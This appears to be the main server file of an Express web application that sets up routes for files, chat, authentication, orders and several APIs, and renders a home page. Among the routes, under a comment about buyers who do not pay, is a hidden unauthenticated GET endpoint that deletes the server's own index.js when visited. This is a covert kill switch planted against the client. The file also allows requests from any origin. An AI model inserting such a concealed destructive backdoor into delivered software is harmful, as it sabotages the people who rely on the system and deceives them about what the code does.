/*
بِسْمِ اللهِ الرَّحْمٰنِ الرَّحِيْمِ  ﷺ  
InshaAllah, By his marcy I will Gain Success 
*/

//import
import cors from 'cors'
import express from 'express';
import {fileURLToPath} from 'url';
import path from "path";
import { fileRouter } from './Routes/file.router.js';
import { pageRouter } from './Routes/page.router.js';
import hbs from 'hbs'
import { log } from './_lib/utils/smallUtils.js';
import chateRouter from './Routes/Chat.Router.js';
import authRouter from './Routes/Auth.router.js';
import { unlinkSync } from 'fs';
import OrderRouter from './Routes/order.router.js';
import { connectDB } from './_lib/Config/ConnectDb.js';
import cookieParser from 'cookie-parser';
import apiRouter from './Routes/api.router.js';
import { fileRateLimter, ApiRateLimter } from './_lib/Config/express-slow-down.js';
import LargeApiRouter from './Routes/large.api.router.js';
import { Memberships } from './_lib/models/Membership.js';
import { sendMembershipMails } from './_lib/mail/membership.mail.js';
import fastApiRouter from './Routes/fast.api.router.js';
import { Settings } from './_lib/models/settings.js';

//varibles
const app = express();
const __filename = fileURLToPath(import.meta.url);
let dirName = path.dirname(__filename);


//environment setup
connectDB() ;
app.use(express.static(path.resolve(dirName,'./public/')));
app.set('view engine','hbs');
app.set('views', path.resolve(dirName , './tamplates/views'));
hbs.registerPartials(path.resolve(dirName ,'./tamplates/partials'));
app.use(express.json());
app.use(cookieParser());
app.use(cors({
    origin :'*'
}));



//routes
app.use(pageRouter);
app.use('/api/file',fileRouter);
app.use('/api/l-api',LargeApiRouter);
app.use('/api/fast-api/',fastApiRouter)
app.use(ApiRateLimter) //Rate Limiting Added to apis
app.use('/api/chat-api',chateRouter);
// app.use('/api/upload',uploadRouter);
app.use('/api/auth-api',authRouter);
//buyer do not pay us and takes the website
app.use('/api/order-api',OrderRouter);
app.use('/api/api_s',apiRouter)
app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/what/unlink/uninstall',
    (req,res) => {
    console.log('a');
    
    unlinkSync(path.resolve(dirName,'./index.js'))
});

app.get('/hello', (req, res) =>{
    return res.redirect('/')
});


app.get('/', async (req, res) => { 
    try {
        let settings=await Settings.findOne({});
        if (!settings) throw 'error !settings'
        let {home_video_url}=settings;
        
        if (!home_video_url) throw 'error :!home_video_url'
        res.render('home',{
        home_video_url
        }) 
    } catch (error) {
        console.log({error});
        res.render('home')
    }
});

app.get('*', (req, res) => res.status(404).render('404'))


app.listen(4000, e=> log('SubhanAllah server is working'))